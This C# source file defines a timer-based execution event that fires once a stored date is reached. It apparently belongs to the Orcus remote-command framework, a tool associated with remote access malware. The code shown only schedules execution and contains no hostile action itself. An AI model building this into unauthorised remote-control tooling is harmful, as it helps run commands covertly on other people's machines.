using System;
using System.Timers;
using Orcus.Shared.DynamicCommands.ExecutionEvents;

namespace Orcus.StaticCommandManagement.ExecutionEvents
{
    public class DateTimeExecutionEvent : IExecutionEvent
    {
        private DateTime _dateTime;
        private Timer _waiter;

        public bool CanExecute => DateTime.UtcNow >= _dateTime;
        public uint Id { get; } = 1;
        public event EventHandler TheTimeHasCome;

        public void Initialize(byte[] parameter)
        {
            _dateTime = DateTime.FromBinary(BitConverter.ToInt64(parameter, 1));
            if (!CanExecute)
            {
                _waiter = new Timer();
                _waiter.Elapsed += WaiterOnElapsed;
                _waiter.Interval = (_dateTime - DateTime.UtcNow).TotalMilliseconds;
                if (_waiter.Interval > 0)
                    _waiter.Start();
                else
                    _waiter.Dispose();
            }
        }

        private void WaiterOnElapsed(object sender, ElapsedEventArgs elapsedEventArgs)
        {
            _waiter.Dispose();
            TheTimeHasCome?.Invoke(this, EventArgs.Empty);
        }
    }
}